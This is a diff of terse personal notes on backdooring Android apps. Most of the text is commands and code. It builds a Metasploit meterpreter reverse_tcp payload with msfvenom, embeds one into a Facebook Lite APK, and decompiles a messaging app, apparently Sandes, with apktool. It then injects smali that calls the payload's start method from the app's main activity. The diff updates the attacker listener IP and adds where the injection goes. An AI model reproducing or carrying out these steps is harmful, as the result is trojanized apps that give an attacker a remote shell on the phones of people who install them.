@@ -86,16 +86,17 @@ msfvenom -x fb_lite.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lp
 
 https://www.youtube.com/watch?v=6SaZqm9c1W0
 
-msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.6.122 LPORT=4444 R > payload.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.132 LPORT=4444 R > payload.apk
 
 apktool d Sandes-Apk-v2.2.19.apk 
 apktool d payload.apk
 
-thunar ot open files
+thunar to open files
 
 where the activity starts 
 in.nic.gimkerala.Call_SFU_three_Activity"
 
+inside Call_SFU_three_Activity
 invoke-super {p0, p1}, Lo/jm0;->onCreate(Landroid/os/Bundle;)V
 invoke-static {p0}, Lcom/metsploit/stage/Payload;->start(Landroid/content/Context;)V
 
